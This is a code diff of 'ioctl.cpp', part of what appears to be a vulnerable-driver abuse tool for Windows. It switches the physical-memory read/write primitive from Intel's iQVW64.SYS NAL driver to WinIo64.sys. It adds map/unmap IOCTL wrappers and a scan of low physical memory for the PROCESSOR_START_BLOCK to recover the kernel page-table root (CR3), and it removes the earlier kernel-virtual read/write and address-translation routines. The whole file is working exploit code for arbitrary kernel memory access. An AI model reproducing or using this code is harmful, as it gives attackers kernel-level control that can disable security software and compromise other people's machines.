@@ -1,64 +1,60 @@
-// ioctl.cpp -- iQVW64.SYS (Intel NAL) physmem implementation.
+// ioctl.cpp -- WinIo64.sys physmem MAP/UNMAP implementation.
 
 #include "ioctl.h"
 
 #include <algorithm>
 #include <cstdio>
 #include <cstring>
-#include <vector>
 
 namespace ioctl {
+
+bool map_physical(HANDLE device, uint64_t phys, uint32_t size, RwFlag /*rw*/, Handle& h) {
+    std::memset(&h, 0, sizeof(h));
+    h.dwPhysMemSizeInBytes = size;
+    h.pvPhysAddress        = phys;
+
+    DWORD returned = 0;
+    BOOL ok = DeviceIoControl(device, IOCTL_MAP_PHYS,
+                              &h, sizeof(h),
+                              &h, sizeof(h),
+                              &returned, nullptr);
+    if (!ok || h.pvPhysMemLin == 0) {
+        std::printf("[!] ioctl::map_physical failed (phys=%016llX size=%u err=%lu)\n",
+                    static_cast<unsigned long long>(phys), size, GetLastError());
+        return false;
+    }
+    return true;
+}
+
+bool unmap_physical(HANDLE device, const Handle& h) {
+    DWORD returned = 0;
+    Handle buf = h;
+    BOOL ok = DeviceIoControl(device, IOCTL_UNMAP_PHYS,
+                              &buf, sizeof(buf),
+                              &buf, sizeof(buf),
+                              &returned, nullptr);
+    if (!ok) {
+        std::printf("[!] ioctl::unmap_physical failed (va=%016llX err=%lu)\n",
+                    static_cast<unsigned long long>(h.pvPhysMemLin), GetLastError());
+        return false;
+    }
+    return true;
+}
 
 bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
     uint8_t* out = static_cast<uint8_t*>(dst);
     while (size) {
-        uint64_t page_base   = phys & ~0xFFFULL;
-        uint32_t page_offset = static_cast<uint32_t>(phys & 0xFFF);
-        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000 - page_offset));
-        DWORD returned = 0;
+        uint64_t page_off = phys & 0xFFFULL;
+        size_t   chunk    = std::min<size_t>(size, 0x1000 - static_cast<size_t>(page_off));
 
-        NalMapInput map{};
-        map.case_number = NAL_CASE_MAP;
-        map.buffer_size = 0x20;
-        map.phys_address = page_base;
-        map.map_size = 0x1000;
-
-        if (!DeviceIoControl(device, IOCTL_NAL,
-                             &map, sizeof(map), nullptr, 0,
-                             &returned, nullptr) || map.mapped_va == 0) {
-            std::printf("[!] ioctl::read_physical MAP failed (phys=%016llX size=%u err=%lu mapped_va=%016llX)\n",
-                        static_cast<unsigned long long>(phys), chunk, GetLastError(),
-                        static_cast<unsigned long long>(map.mapped_va));
+        Handle h{};
+        if (!map_physical(device, phys & ~0xFFFULL, 0x1000, RW_READ, h))
             return false;
-        }
 
-        NalCopyInput copy{};
-        copy.case_number = NAL_CASE_COPY;
-        copy.buffer_size = 0x18;
-        copy.source = map.mapped_va + page_offset;
-        copy.destination = reinterpret_cast<uint64_t>(out);
-        copy.length = chunk;
+        std::memcpy(out, reinterpret_cast<uint8_t*>(h.pvPhysMemLin) + page_off, chunk);
 
-        bool copy_ok = DeviceIoControl(device, IOCTL_NAL,
-                                       &copy, sizeof(copy), nullptr, 0,
-                                       &returned, nullptr);
-        if (!copy_ok) {
-            std::printf("[!] ioctl::read_physical COPY failed (va=%016llX size=%u err=%lu)\n",
-                        static_cast<unsigned long long>(map.mapped_va + page_offset), chunk, GetLastError());
-        }
-
-        NalMapInput unmap{};
-        unmap.case_number = NAL_CASE_UNMAP;
-        unmap.buffer_size = 0x20;
-        unmap.mapped_va = map.mapped_va;
-        unmap.phys_address = 0x1000;
-        unmap.map_size = 0x1000;
-
-        DeviceIoControl(device, IOCTL_NAL,
-                        &unmap, sizeof(unmap), nullptr, 0,
-                        &returned, nullptr);
-
-        if (!copy_ok) return false;
+        if (!unmap_physical(device, h))
+            return false;
 
         phys += chunk;
         out  += chunk;
@@ -70,53 +66,17 @@ bool read_physical(HANDLE device, uint64_t phys, void* dst, size_t size) {
 bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) {
     const uint8_t* in = static_cast<const uint8_t*>(src);
     while (size) {
-        uint64_t page_base   = phys & ~0xFFFULL;
-        uint32_t page_offset = static_cast<uint32_t>(phys & 0xFFF);
-        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000 - page_offset));
-        DWORD returned = 0;
+        uint64_t page_off = phys & 0xFFFULL;
+        size_t   chunk    = std::min<size_t>(size, 0x1000 - static_cast<size_t>(page_off));
 
-        NalMapInput map{};
-        map.case_number = NAL_CASE_MAP;
-        map.buffer_size = 0x20;
-        map.phys_address = page_base;
-        map.map_size = 0x1000;
-
-        if (!DeviceIoControl(device, IOCTL_NAL,
-                             &map, sizeof(map), nullptr, 0,
-                             &returned, nullptr) || map.mapped_va == 0) {
-            std::printf("[!] ioctl::write_physical MAP failed (phys=%016llX size=%u err=%lu mapped_va=%016llX)\n",
-                        static_cast<unsigned long long>(phys), chunk, GetLastError(),
-                        static_cast<unsigned long long>(map.mapped_va));
+        Handle h{};
+        if (!map_physical(device, phys & ~0xFFFULL, 0x1000, RW_WRITE, h))
             return false;
-        }
 
-        NalCopyInput copy{};
-        copy.case_number = NAL_CASE_COPY;
-        copy.buffer_size = 0x18;
-        copy.source = reinterpret_cast<uint64_t>(in);
-        copy.destination = map.mapped_va + page_offset;
-        copy.length = chunk;
+        std::memcpy(reinterpret_cast<uint8_t*>(h.pvPhysMemLin) + page_off, in, chunk);
 
-        bool copy_ok = DeviceIoControl(device, IOCTL_NAL,
-                                       &copy, sizeof(copy), nullptr, 0,
-                                       &returned, nullptr);
-        if (!copy_ok) {
-            std::printf("[!] ioctl::write_physical COPY failed (va=%016llX size=%u err=%lu)\n",
-                        static_cast<unsigned long long>(map.mapped_va + page_offset), chunk, GetLastError());
-        }
-
-        NalMapInput unmap{};
-        unmap.case_number = NAL_CASE_UNMAP;
-        unmap.buffer_size = 0x20;
-        unmap.mapped_va = map.mapped_va;
-        unmap.phys_address = 0x1000;
-        unmap.map_size = 0x1000;
-
-        DeviceIoControl(device, IOCTL_NAL,
-                        &unmap, sizeof(unmap), nullptr, 0,
-                        &returned, nullptr);
-
-        if (!copy_ok) return false;
+        if (!unmap_physical(device, h))
+            return false;
 
         phys += chunk;
         in   += chunk;
@@ -125,98 +85,21 @@ bool write_physical(HANDLE device, uint64_t phys, const void* src, size_t size) 
     return true;
 }
 
-bool read_kernel_virtual(HANDLE device, uint64_t kernel_va, void* dst, size_t size) {
-    uint8_t* out = static_cast<uint8_t*>(dst);
-    while (size) {
-        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000));
-        DWORD returned = 0;
-
-        NalCopyInput copy{};
-        copy.case_number = NAL_CASE_COPY;
-        copy.buffer_size = 0x18;
-        copy.source = kernel_va;
-        copy.destination = reinterpret_cast<uint64_t>(out);
-        copy.length = chunk;
-
-        if (!DeviceIoControl(device, IOCTL_NAL,
-                             &copy, sizeof(copy), nullptr, 0,
-                             &returned, nullptr)) {
-            std::printf("[!] ioctl::read_kernel_virtual COPY failed (va=%016llX size=%u err=%lu)\n",
-                        static_cast<unsigned long long>(kernel_va), chunk, GetLastError());
-            return false;
-        }
-
-        kernel_va += chunk;
-        out += chunk;
-        size -= chunk;
-    }
-    return true;
-}
-
-bool write_kernel_virtual(HANDLE device, uint64_t kernel_va, const void* src, size_t size) {
-    const uint8_t* in = static_cast<const uint8_t*>(src);
-    while (size) {
-        DWORD chunk = static_cast<DWORD>(std::min<size_t>(size, 0x1000));
-        DWORD returned = 0;
-
-        NalCopyInput copy{};
-        copy.case_number = NAL_CASE_COPY;
-        copy.buffer_size = 0x18;
-        copy.source = reinterpret_cast<uint64_t>(in);
-        copy.destination = kernel_va;
-        copy.length = chunk;
-
-        if (!DeviceIoControl(device, IOCTL_NAL,
-                             &copy, sizeof(copy), nullptr, 0,
-                             &returned, nullptr)) {
-            std::printf("[!] ioctl::write_kernel_virtual COPY failed (va=%016llX size=%u err=%lu)\n",
-                        static_cast<unsigned long long>(kernel_va), chunk, GetLastError());
-            return false;
-        }
-
-        kernel_va += chunk;
-        in += chunk;
-        size -= chunk;
-    }
-    return true;
-}
-
-bool virt_to_phys(HANDLE device, uint64_t kernel_va, uint64_t& phys) {
-    NalVtopInput req{};
-    req.case_number = NAL_CASE_VTOP;
-    req.buffer_size = 0x10;
-    req.virt_addr = kernel_va;
-
-    DWORD returned = 0;
-    if (!DeviceIoControl(device, IOCTL_NAL,
-                         &req, sizeof(req), nullptr, 0,
-                         &returned, nullptr)) {
-        std::printf("[!] ioctl::virt_to_phys failed (va=%016llX err=%lu)\n",
-                    static_cast<unsigned long long>(kernel_va), GetLastError());
-        return false;
-    }
-
-    phys = req.out_phys;
-    if (phys == 0) {
-        std::printf("[!] ioctl::virt_to_phys returned 0 (va=%016llX)\n",
-                    static_cast<unsigned long long>(kernel_va));
-        return false;
-    }
-    return true;
-}
-
+// Map the low 1 MB and scan for the PROCESSOR_START_BLOCK fingerprint.
+// CR3 sits at offset 160 of the matching page. Three qword fingerprints
+// at offsets 0, 112, 160 uniquely identify the struct across Windows 10/11.
 bool get_pml4_phys(HANDLE device, uint64_t& cr3) {
-    std::vector<uint8_t> mem(0x100000, 0);
-    if (!read_physical(device, 0x1000, mem.data() + 0x1000, 0x100000 - 0x1000)) {
-        std::printf("[!] ioctl::get_pml4_phys: read of low 1MB failed\n");
+    Handle h{};
+    if (!map_physical(device, 0, 0x100000, RW_READ, h))
         return false;
-    }
 
+    const uint8_t* mem = reinterpret_cast<const uint8_t*>(h.pvPhysMemLin);
     cr3 = 0;
+
     for (uint32_t off = 0x1000; off < 0x100000; off += 0x1000) {
-        uint64_t sig0   = *reinterpret_cast<const uint64_t*>(mem.data() + off);
-        uint64_t ptr112 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 112);
-        uint64_t val160 = *reinterpret_cast<const uint64_t*>(mem.data() + off + 160);
+        uint64_t sig0   = *reinterpret_cast<const uint64_t*>(mem + off);
+        uint64_t ptr112 = *reinterpret_cast<const uint64_t*>(mem + off + 112);
+        uint64_t val160 = *reinterpret_cast<const uint64_t*>(mem + off + 160);
 
         if ((sig0   & 0xFFFFFFFFFFFF00FFULL) == 0x00000001000600E9ULL &&
             (ptr112 & 0xFFFFF80000000003ULL) == 0xFFFFF80000000000ULL &&
@@ -225,6 +108,8 @@ bool get_pml4_phys(HANDLE device, uint64_t& cr3) {
             break;
         }
     }
+
+    unmap_physical(device, h);
 
     if (cr3 == 0) {
         std::printf("[!] ioctl::get_pml4_phys: CR3 scan found no matching page in low 1 MB\n");
